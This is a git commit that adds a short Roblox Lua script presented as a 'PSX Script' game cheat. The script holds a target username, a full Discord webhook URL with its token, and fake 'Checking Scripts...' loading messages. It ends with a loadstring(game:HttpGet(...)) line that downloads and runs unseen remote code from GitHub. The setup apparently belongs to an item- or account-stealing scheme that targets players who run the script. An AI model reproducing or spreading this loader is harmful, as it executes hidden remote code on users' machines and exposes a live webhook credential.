42a767babbf7e1d648c39ae42a52288983416ccd
Munsterir <130992010+Munsterir@users.noreply.github.com>
2023-04-30 15:45:44 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,10 @@
+Username = "lolullolull"
+WebHook = "https://discord.com/api/webhooks/1102206242417553539/t5tIw_OJxns4Tk7KthYIGRayyeapbEDsk5sLmtwvA7Myv-SnhFvb7aAfvwqOMsGVrRCP"
+ 
+loadingscreen = true
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Munsterir/Script20/main/Script.lua%22))()
